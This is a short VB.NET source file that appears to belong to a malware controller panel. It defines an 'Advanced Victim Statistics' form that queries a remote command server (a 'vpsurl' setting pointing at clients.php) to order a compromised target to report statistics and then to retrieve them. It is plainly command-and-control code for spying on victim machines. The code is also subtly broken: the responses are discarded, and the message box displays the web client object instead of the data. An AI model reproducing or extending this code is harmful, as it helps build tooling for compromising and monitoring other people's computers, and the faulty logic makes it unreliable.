Imports System.Net

Public Class AdvancedStats
    Public targetIp As String

    Private Sub AdvancedStats_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' TODO : wtf ? why a form ?
        Me.Text = "Advanced Victim Statistics - " & targetIp
        Dim client As New WebClient
        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=getstatistics")
        Threading.Thread.Sleep(3500)
        client.DownloadString(My.Settings.vpsurl & "clients.php?action=getstatistics&target=" & targetIp)
        MsgBox(client)
    End Sub
End Class